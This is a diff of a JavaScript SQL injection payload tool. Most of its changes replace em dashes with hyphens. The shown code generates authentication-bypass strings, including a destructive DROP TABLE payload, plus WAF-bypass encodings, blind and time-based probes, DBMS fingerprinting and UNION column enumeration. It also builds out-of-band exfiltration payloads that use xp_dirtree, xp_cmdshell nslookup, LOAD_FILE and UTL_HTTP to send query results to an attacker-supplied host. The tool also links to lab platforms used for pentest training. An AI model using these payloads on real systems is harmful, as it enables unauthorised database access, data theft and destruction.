-      {name:'HackTheBox',url:'https://app.hackthebox.com/',desc:'CTF machines with real SQLi vulnerabilities — community writeups available.'},
-      {name:'TryHackMe — SQL Injection Lab',url:'https://tryhackme.com/room/sqlilab',desc:'Beginner-friendly guided room — covers all major techniques.'},
-      {name:'TryHackMe — Advanced SQL Injection',url:'https://tryhackme.com/room/advancedsqlinjection',desc:'Time-based, OOB, WAF bypass — intermediate level.'},
-      {name:'DVWA (Damn Vulnerable Web App)',url:'https://dvwa.co.uk/',desc:'Local lab — SQLi at 4 difficulty levels with source code review.'},
+      {name:'PortSwigger Web Security Academy',url:'https://portswigger.net/web-security/sql-injection',desc:'25+ interactive SQLi labs - from basic UNION to advanced blind OOB.'},
+      {name:'HackTheBox',url:'https://app.hackthebox.com/',desc:'CTF machines with real SQLi vulnerabilities - community writeups available.'},
+      {name:'TryHackMe - SQL Injection Lab',url:'https://tryhackme.com/room/sqlilab',desc:'Beginner-friendly guided room - covers all major techniques.'},
+      {name:'TryHackMe - Advanced SQL Injection',url:'https://tryhackme.com/room/advancedsqlinjection',desc:'Time-based, OOB, WAF bypass - intermediate level.'},
+      {name:'DVWA (Damn Vulnerable Web App)',url:'https://dvwa.co.uk/',desc:'Local lab - SQLi at 4 difficulty levels with source code review.'},
       {name:'bWAPP',url:'http://www.itsecgames.com/',desc:'100+ web vulnerabilities including multiple SQLi scenarios.'},
-      {name:'WebGoat',url:'https://owasp.org/www-project-webgoat/',desc:'OWASP learning platform — structured SQLi lessons with hints.'},
-      {name:'PentesterLab — From SQL Injection to Shell',url:'https://pentesterlab.com/exercises/from_sqli_to_shell',desc:'Classic exercise: blind SQLi → shell via file write.'},
+      {name:'WebGoat',url:'https://owasp.org/www-project-webgoat/',desc:'OWASP learning platform - structured SQLi lessons with hints.'},
+      {name:'PentesterLab - From SQL Injection to Shell',url:'https://pentesterlab.com/exercises/from_sqli_to_shell',desc:'Classic exercise: blind SQLi → shell via file write.'},
     ]},
     {cat:'🔎 Wordlists for Burp Intruder',items:[
-      {name:'FUZZ — SQL Injection Detection',url:'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt',desc:'Generic detection payloads — paste directly into Burp Intruder positions.'},
-      {name:'FUZZ — SQL Injection Error Strings',url:'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt',desc:'Error string patterns to look for in responses.'},
-      {name:'FUZZ — Time-Based SQLi',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_TimeBased_SQLi.txt',desc:'Time-based detection — use with Burp\'s response timing comparison.'},
-      {name:'FUZZ — UNION All',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/UNION%20based/MySQL-UNION-Based.txt',desc:'MySQL UNION exploitation payloads for Burp.'},
+      {name:'FUZZ - SQL Injection Detection',url:'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt',desc:'Generic detection payloads - paste directly into Burp Intruder positions.'},
+      {name:'FUZZ - SQL Injection Error Strings',url:'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt',desc:'Error string patterns to look for in responses.'},
+      {name:'FUZZ - Time-Based SQLi',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_TimeBased_SQLi.txt',desc:'Time-based detection - use with Burp\'s response timing comparison.'},
+      {name:'FUZZ - UNION All',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/UNION%20based/MySQL-UNION-Based.txt',desc:'MySQL UNION exploitation payloads for Burp.'},
     ]},
     {cat:'📖 Books & Deep Dives',items:[
-      {name:'The Web Application Hacker\'s Handbook',url:'https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470',desc:'Chapter 9: Injecting into Interpreted Languages — definitive SQLi coverage.'},
+      {name:'The Web Application Hacker\'s Handbook',url:'https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470',desc:'Chapter 9: Injecting into Interpreted Languages - definitive SQLi coverage.'},
       {name:'Real World Bug Hunting',url:'https://nostarch.com/bughunting',desc:'Chapter on SQL injection with real-world bug bounty examples.'},
-      {name:'Advanced SQL Injection in SQL Server',url:'https://www.cgisecurity.com/lib/advanced_sql_injection.txt',desc:'Classic 2002 paper — still relevant for MSSQL stacked queries and xp_cmdshell.'},
+      {name:'Advanced SQL Injection in SQL Server',url:'https://www.cgisecurity.com/lib/advanced_sql_injection.txt',desc:'Classic 2002 paper - still relevant for MSSQL stacked queries and xp_cmdshell.'},
       {name:'Blind SQL Injection Discovery & Exploitation',url:'https://www.exploit-db.com/docs/english/17053-blind-sql-injection-discoveryand-exploitation.pdf',desc:'Detailed paper on boolean and time-based blind techniques.'},
     ]},
   ];
@@ -4420,14 +4420,14 @@ function showEmbeddedPayloadBox() {
     </div>`).join('');
 }
 
-// ── 6. ENHANCED Auth Bypass — add more payloads to library ───
+// ── 6. ENHANCED Auth Bypass - add more payloads to library ───
 const _origInitAuthLib = typeof initAuthLib === 'function' ? initAuthLib : null;
 function initAuthLib() {
   const el = document.getElementById('auth-all-payloads');
   if(!el) return;
   const extraAuth = [
-    {payload:"' OR ''='",desc:'Empty string equality — always true'},
-    {payload:"' OR 'x'='x",desc:'Non-empty string equality — always true'},
+    {payload:"' OR ''='",desc:'Empty string equality - always true'},
+    {payload:"' OR 'x'='x",desc:'Non-empty string equality - always true'},
     {payload:"') OR ('x'='x",desc:'Paren close + always true'},
     {payload:"1 OR '1'='1",desc:'Mixed integer + string OR'},
     {payload:"' OR 1=1 LIMIT 1--",desc:'Limit to single result'},
@@ -4440,17 +4440,17 @@ function initAuthLib() {
     {payload:"') or ('1'='1'--",desc:'Paren-wrapped double-comment'},
     {payload:"%27 OR 1=1--",desc:'URL-encoded quote OR bypass'},
     {payload:"1;DROP TABLE users--",desc:'Destructive test (SQLi confirmed if table drops)'},
-    {payload:"' AND password LIKE '%",desc:'LIKE wildcard — match any password'},
+    {payload:"' AND password LIKE '%",desc:'LIKE wildcard - match any password'},
     {payload:"admin'-- -",desc:'Comment truncation (space after dashes)'},
     {payload:"' OR sleep(3)='",desc:'MySQL time bypass via string context'},
-    {payload:"admin' AND '1'='1",desc:'AND true — login if admin exists'},
-    {payload:"admin' AND '1'='2",desc:'AND false — page should differ from true'},
+    {payload:"admin' AND '1'='1",desc:'AND true - login if admin exists'},
+    {payload:"admin' AND '1'='2",desc:'AND false - page should differ from true'},
   ];
   const baseHtml = (DB && DB.auth) ? DB.auth.map(p=>makePayloadItem(p.payload,p.desc)).join('') : '';
   el.innerHTML = baseHtml + extraAuth.map(p=>makePayloadItem(p.payload,p.desc)).join('');
 }
 
-// ── 7. ENHANCED WAF Bypass page — more techniques ────────────
+// ── 7. ENHANCED WAF Bypass page - more techniques ────────────
 const _origInitWafLib = typeof initWafLib === 'function' ? initWafLib : null;
 function initWafLib() {
   const el = document.getElementById('waf-lib');
@@ -4477,7 +4477,7 @@ function initWafLib() {
   el.innerHTML = baseHtml + extra.map(p=>makePayloadItem(p.payload,p.desc,p.tags||[])).join('');
 }
 
-// ── 8. ENHANCED Encoder — add more encoding types ────────────
+// ── 8. ENHANCED Encoder - add more encoding types ────────────
 const _origEncodeAll = typeof encodeAll === 'function' ? encodeAll : null;
 function encodeAll() {
   if(_origEncodeAll) _origEncodeAll();
@@ -4485,15 +4485,15 @@ function encodeAll() {
   // Add extra outputs not in original
   const extraEncodings = [
     {id:'out-mysql-hex',  label:'MySQL HEX()',    fn:v=>`HEX('${v}')`},
-    {id:'out-sql-char',   label:'SQL CHAR()',     fn:v=>v?`CHAR(${Array.from(v).map(c=>c.charCodeAt(0)).join(',')})`:'—'},
-    {id:'out-concat',     label:"CONCAT('a','b')",fn:v=>v?`CONCAT(${v.split('').map(c=>`'${c}'`).join(',')})`:'—'},
+    {id:'out-sql-char',   label:'SQL CHAR()',     fn:v=>v?`CHAR(${Array.from(v).map(c=>c.charCodeAt(0)).join(',')})`:'-'},
+    {id:'out-concat',     label:"CONCAT('a','b')",fn:v=>v?`CONCAT(${v.split('').map(c=>`'${c}'`).join(',')})`:'-'},
     {id:'out-substr',     label:'SUBSTRING bypass',fn:v=>{
-      if(!v) return '—';
+      if(!v) return '-';
       const mid=Math.floor(v.length/2);
       return `CONCAT(SUBSTRING('${v}',1,${mid}),SUBSTRING('${v}',${mid+1}))`;
     }},
     {id:'out-comment-break',label:'Comment break',fn:v=>{
-      if(!v) return '—';
+      if(!v) return '-';
       const mid=Math.floor(v.length/2);
       return v.slice(0,mid)+'/**/'+v.slice(mid);
     }},
@@ -4505,7 +4505,7 @@ function encodeAll() {
       if(parent){
         const div=document.createElement('div');
         div.className='payload-item';
-        div.innerHTML=`<div style="flex:1"><div class="payload-desc" style="font-size:10px;color:var(--text3)">${esc(label)}</div><div class="payload-code" id="${id}">—</div></div><button class="btn btn-copy" onclick="copyText(document.getElementById('${id}').textContent)">&#10096; Copy</button>`;
+        div.innerHTML=`<div style="flex:1"><div class="payload-desc" style="font-size:10px;color:var(--text3)">${esc(label)}</div><div class="payload-code" id="${id}">-</div></div><button class="btn btn-copy" onclick="copyText(document.getElementById('${id}').textContent)">&#10096; Copy</button>`;
         parent.appendChild(div);
         el=document.getElementById(id);
       }
@@ -4514,7 +4514,7 @@ function encodeAll() {
   });
 }
 
-// ── 9. ENHANCED Stacked/OOB — add more DNS exfil examples ────
+// ── 9. ENHANCED Stacked/OOB - add more DNS exfil examples ────
 const _origGenerateOobDns = typeof generateOobDnsPayloads === 'function' ? generateOobDnsPayloads : null;
 function generateOobDnsPayloads() {
   if(_origGenerateOobDns) _origGenerateOobDns();
@@ -4527,12 +4527,12 @@ function generateOobDnsPayloads() {
 
   const extra = [];
   if(dbms==='mssql') {
-    extra.push({payload:`${p}; EXEC master..xp_dirtree '\\\\'+CAST(${expr} AS varchar(500))+'---${host}\\a'${c}`,desc:'MSSQL xp_dirtree — full expression in hostname'});
+    extra.push({payload:`${p}; EXEC master..xp_dirtree '\\\\'+CAST(${expr} AS varchar(500))+'---${host}\\a'${c}`,desc:'MSSQL xp_dirtree - full expression in hostname'});
     extra.push({payload:`${p}; DECLARE @q varchar(200); SET @q='\\\\'+CAST(${expr} AS varchar(100))+'.${host}\\x'; EXEC master..xp_dirtree @q${c}`,desc:'MSSQL xp_dirtree via variable'});
     extra.push({payload:`${p}; EXEC master..xp_fileexist '\\\\'+CAST(${expr} AS varchar(100))+'.${host}\\x'${c}`,desc:'MSSQL xp_fileexist DNS trigger'});
     extra.push({payload:`${p}; EXEC xp_cmdshell 'nslookup '+CAST(${expr} AS varchar(100))+'.${host}'${c}`,desc:'MSSQL xp_cmdshell nslookup exfil'});
   } else if(dbms==='mysql') {
-    extra.push({payload:`${p} AND LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',REPLACE(${expr},' ','_'),'.${host}\\\\x'))${c}`,desc:'MySQL LOAD_FILE DNS — spaces replaced with underscores'});
+    extra.push({payload:`${p} AND LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',REPLACE(${expr},' ','_'),'.${host}\\\\x'))${c}`,desc:'MySQL LOAD_FILE DNS - spaces replaced with underscores'});
     extra.push({payload:`${p}; SELECT ${expr} INTO OUTFILE '\\\\\\\\${host}\\\\share\\\\out.txt'${c}`,desc:'MySQL INTO OUTFILE UNC path'});
   } else if(dbms==='oracle') {
     extra.push({payload:`' UNION SELECT UTL_HTTP.REQUEST('http://'||REPLACE(TO_CHAR(${expr}),' ','_')||'.${host}/') FROM DUAL${c}`,desc:'Oracle UTL_HTTP with space replacement'});
@@ -5050,7 +5050,7 @@ function deGeneratePolyglots() {
 
   // Universal Marker Payloads
   html += buildSection('🎯 Unique Marker Injection (Per Parameter)', [
-    { payload: params.map((p, i) => `${p}=1'/*P${i + 1}*/`).join('&'), desc: 'All params with unique markers — error mentions /*Pn*/ = param n is injectable' },
+    { payload: params.map((p, i) => `${p}=1'/*P${i + 1}*/`).join('&'), desc: 'All params with unique markers - error mentions /*Pn*/ = param n is injectable' },
     { payload: params.map((p, i) => `${p}=1'/*P${i + 1}*/ AND '1'='1`).join('&'), desc: 'All params TRUE condition with markers' },
     { payload: params.map((p, i) => `${p}=1'/*P${i + 1}*/ AND '1'='2`).join('&'), desc: 'All params FALSE condition with markers' },
   ]);
@@ -5058,7 +5058,7 @@ function deGeneratePolyglots() {
   // Error-based universal
   if (sqliTypes.includes('error')) {
     html += buildSection('💥 Error Trigger Payloads', [
-      { payload: `'`, desc: 'Single quote — basic syntax break' },
+      { payload: `'`, desc: 'Single quote - basic syntax break' },
       { payload: `"`, desc: 'Double quote test' },
       { payload: `')`, desc: 'Close paren + quote' },
       { payload: `'))`, desc: 'Double paren close' },
@@ -5073,7 +5073,7 @@ function deGeneratePolyglots() {
   if (sqliTypes.includes('blind_bool')) {
     html += buildSection('🔀 Boolean Detection Payloads', [
       { payload: `' AND '1'='1`, desc: 'TRUE condition (string)' },
-      { payload: `' AND '1'='2`, desc: 'FALSE condition (string) — page should differ' },
+      { payload: `' AND '1'='2`, desc: 'FALSE condition (string) - page should differ' },
       { payload: `" AND "1"="1`, desc: 'TRUE (double quote)' },
       { payload: `" AND "1"="2`, desc: 'FALSE (double quote)' },
       { payload: `1 AND 1=1`, desc: 'TRUE (numeric)' },
@@ -5114,7 +5114,7 @@ function deGeneratePolyglots() {
       { payload: `'; SELECT 1-- -`, desc: 'Basic stacked query test' },
       { payload: `'; SELECT pg_sleep(3)-- -`, desc: 'PostgreSQL stacked sleep' },
       { payload: `'; WAITFOR DELAY '0:0:3'-- -`, desc: 'MSSQL stacked delay' },
-      { payload: `'; SELECT SLEEP(3)-- -`, desc: 'MySQL stacked (rare — needs multi-statement)' },
+      { payload: `'; SELECT SLEEP(3)-- -`, desc: 'MySQL stacked (rare - needs multi-statement)' },
     ]);
   }
 
@@ -5139,33 +5139,33 @@ function deGenerateContextPayloads() {
 
   // WHERE String Context
   html += buildSection('📍 WHERE Clause (String Context)', [
-    { payload: `${testValue}' AND '1'='1`, desc: 'TRUE condition — page loads normally' },
-    { payload: `${testValue}' AND '1'='2`, desc: 'FALSE condition — page differs = injectable' },
-    { payload: `${testValue}'`, desc: 'Error trigger — syntax error = injectable' },
-    { payload: `${testValue}' OR '1'='1`, desc: 'OR TRUE — all rows returned' },
+    { payload: `${testValue}' AND '1'='1`, desc: 'TRUE condition - page loads normally' },
+    { payload: `${testValue}' AND '1'='2`, desc: 'FALSE condition - page differs = injectable' },
+    { payload: `${testValue}'`, desc: 'Error trigger - syntax error = injectable' },
+    { payload: `${testValue}' OR '1'='1`, desc: 'OR TRUE - all rows returned' },
   ]);
 
   // WHERE Numeric Context
   html += buildSection('📍 WHERE Clause (Numeric Context)', [
     { payload: `${testValue} AND 1=1`, desc: 'TRUE condition' },
-    { payload: `${testValue} AND 1=2`, desc: 'FALSE condition — page differs = injectable' },
-    { payload: `${testValue}+1-1`, desc: 'Math verification — same result as original' },
-    { payload: `${testValue}*1`, desc: 'Multiply by 1 — same result' },
+    { payload: `${testValue} AND 1=2`, desc: 'FALSE condition - page differs = injectable' },
+    { payload: `${testValue}+1-1`, desc: 'Math verification - same result as original' },
+    { payload: `${testValue}*1`, desc: 'Multiply by 1 - same result' },
   ]);
 
   // ORDER BY Context
   html += buildSection('📍 ORDER BY Context', [
-    { payload: `1`, desc: 'Baseline — sort by column 1' },
-    { payload: `2`, desc: 'Sort by column 2 — order changes' },
+    { payload: `1`, desc: 'Baseline - sort by column 1' },
+    { payload: `2`, desc: 'Sort by column 2 - order changes' },
     { payload: `1,2,3${comment}`, desc: 'Multiple columns' },
     { payload: `1 DESC${comment}`, desc: 'Reverse order' },
-    { payload: `(CASE WHEN 1=1 THEN 1 ELSE 2 END)`, desc: 'CASE boolean — TRUE returns col 1' },
-    { payload: `(CASE WHEN 1=2 THEN 1 ELSE 2 END)`, desc: 'CASE boolean — FALSE returns col 2' },
+    { payload: `(CASE WHEN 1=1 THEN 1 ELSE 2 END)`, desc: 'CASE boolean - TRUE returns col 1' },
+    { payload: `(CASE WHEN 1=2 THEN 1 ELSE 2 END)`, desc: 'CASE boolean - FALSE returns col 2' },
   ]);
 
   // LIMIT Context
   html += buildSection('📍 LIMIT/OFFSET Context', [
-    { payload: `5,10${comment}`, desc: 'LIMIT 5,10 — row count changes' },
+    { payload: `5,10${comment}`, desc: 'LIMIT 5,10 - row count changes' },
     { payload: `${testValue}+1`, desc: 'Math-based detection' },
     { payload: `1;SELECT 1${comment}`, desc: 'Stacked query test' },
   ]);
@@ -5230,9 +5230,9 @@ function deGenerateFingerprintPayloads() {
 
   // String concatenation test
   html += buildSection('🔤 String Concatenation (Different syntax per DBMS)', [
-    { payload: `' 'test`, desc: 'MySQL — space concatenation' },
-    { payload: `'+'test`, desc: 'MSSQL — plus concatenation' },
-    { payload: `'||'test`, desc: 'PostgreSQL/Oracle/SQLite — pipe concatenation' },
+    { payload: `' 'test`, desc: 'MySQL - space concatenation' },
+    { payload: `'+'test`, desc: 'MSSQL - plus concatenation' },
+    { payload: `'||'test`, desc: 'PostgreSQL/Oracle/SQLite - pipe concatenation' },
   ]);
 
   // Version extraction
@@ -5247,16 +5247,16 @@ function deGenerateFingerprintPayloads() {
 
   // Time-based fingerprint
   html += buildSection('⏱️ Time-Based Fingerprinting (Different sleep functions)', [
-    { payload: `' AND SLEEP(3)-- -`, desc: 'MySQL SLEEP — 3s delay = MySQL' },
-    { payload: `'; WAITFOR DELAY '0:0:3'-- -`, desc: 'MSSQL WAITFOR — 3s delay = MSSQL' },
-    { payload: `' AND (SELECT pg_sleep(3))-- -`, desc: 'PostgreSQL pg_sleep — 3s delay = PostgreSQL' },
+    { payload: `' AND SLEEP(3)-- -`, desc: 'MySQL SLEEP - 3s delay = MySQL' },
+    { payload: `'; WAITFOR DELAY '0:0:3'-- -`, desc: 'MSSQL WAITFOR - 3s delay = MSSQL' },
+    { payload: `' AND (SELECT pg_sleep(3))-- -`, desc: 'PostgreSQL pg_sleep - 3s delay = PostgreSQL' },
     { payload: `' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END FROM dual)-- -`, desc: 'Oracle DBMS_PIPE' },
   ]);
 
   // Dual table test
   html += buildSection('📊 FROM dual Test (Oracle-specific)', [
-    { payload: `' UNION SELECT NULL FROM dual-- -`, desc: 'Oracle requires FROM dual — no error = Oracle' },
-    { payload: `' UNION SELECT NULL-- -`, desc: 'Others — no FROM needed' },
+    { payload: `' UNION SELECT NULL FROM dual-- -`, desc: 'Oracle requires FROM dual - no error = Oracle' },
+    { payload: `' UNION SELECT NULL-- -`, desc: 'Others - no FROM needed' },
   ]);
 
   document.getElementById('de-fingerprint-payloads').innerHTML = html;
@@ -5901,7 +5901,7 @@ function wizAnalyzeError() {
       <div class="form-row">
         <div class="label">Override DBMS</div>
         <select class="select" id="wiz-dbms-override" onchange="wizUpdateDbms()">
-          <option value="">— Auto-detected —</option>
+          <option value="">- Auto-detected -</option>
           <option value="mysql" ${detectedDbms==='mysql'?'selected':''}>MySQL/MariaDB</option>
           <option value="pgsql" ${detectedDbms==='pgsql'?'selected':''}>PostgreSQL</option>
           <option value="mssql" ${detectedDbms==='mssql'?'selected':''}>MSSQL</option>
@@ -5954,7 +5954,7 @@ function wizGenColCount() {
   // ORDER BY method
   payloads.push({ payload: '═══ ORDER BY (error at N+1 = N columns) ═══', desc: '' });
   for (let i = 1; i <= 15; i++) {
-    payloads.push({ payload: `${p} ORDER BY ${i}${c}`, desc: `ORDER BY ${i} — error = ${i-1} columns` });
+    payloads.push({ payload: `${p} ORDER BY ${i}${c}`, desc: `ORDER BY ${i} - error = ${i-1} columns` });
   }
   
   // UNION NULL method
@@ -6093,7 +6093,7 @@ function wizGenAllNullUnion() {
   payloads.push({ payload: '═══ NULL-SAFE UNION (matches any type) ═══', desc: '' });
   
   const nulls = Array(cols).fill('NULL').join(',');
-  payloads.push({ payload: `${p} UNION SELECT ${nulls}${c}`, desc: 'All NULL — should work if column count is correct' });
+  payloads.push({ payload: `${p} UNION SELECT ${nulls}${c}`, desc: 'All NULL - should work if column count is correct' });
   
   if (dbms === 'oracle') {
     payloads.push({ payload: `${p} UNION SELECT ${nulls} FROM dual${c}`, desc: 'Oracle: NULL UNION with dual' });
@@ -6115,7 +6115,7 @@ function wizGenTypeProbe() {
   // First: all NULL baseline
   payloads.push({ payload: '═══ STEP 1: BASELINE (all NULL) ═══', desc: '' });
   const nulls = Array(cols).fill('NULL').join(',');
-  payloads.push({ payload: `${p} UNION SELECT ${nulls}${dual}${c}`, desc: 'All NULL — must work first!' });
+  payloads.push({ payload: `${p} UNION SELECT ${nulls}${dual}${c}`, desc: 'All NULL - must work first!' });
 
   // Test INTEGER for each column
   payloads.push({ payload: '═══ STEP 2: PROBE INTEGER COLUMNS ═══', desc: '' });
@@ -6414,7 +6414,7 @@ function wizGenVisibleCol() {
   // Numeric markers
   payloads.push({ payload: '═══ NUMERIC MARKERS (look for numbers on page) ═══', desc: '' });
   const numParts = Array.from({ length: cols }, (_, i) => i + 1);
-  payloads.push({ payload: `${p} UNION SELECT ${numParts.join(',')}${dual}${c}`, desc: 'All columns numbered — visible number = visible column' });
+  payloads.push({ payload: `${p} UNION SELECT ${numParts.join(',')}${dual}${c}`, desc: 'All columns numbered - visible number = visible column' });
   
   // NULL-safe (all NULL except one)
   payloads.push({ payload: '═══ NULL-SAFE (one marker at a time) ═══', desc: '' });
@@ -7022,7 +7022,7 @@ function ampAnalyze() {
   document.getElementById('amp-detection').style.display = 'block';
   document.getElementById('amp-det-dbms').textContent = dbmsNames[dbms] || dbms;
   document.getElementById('amp-det-type').textContent = typeNames[injType] || injType;
-  document.getElementById('amp-det-prefix').textContent = extraction.wrapperStart || '—';
+  document.getElementById('amp-det-prefix').textContent = extraction.wrapperStart || '-';
   document.getElementById('amp-det-suffix').textContent = AMP_STATE.comment || '(none)';
   document.getElementById('amp-det-slot').textContent = AMP_STATE.dataQuery.substring(0, 50) + (AMP_STATE.dataQuery.length > 50 ? '...' : '');
 
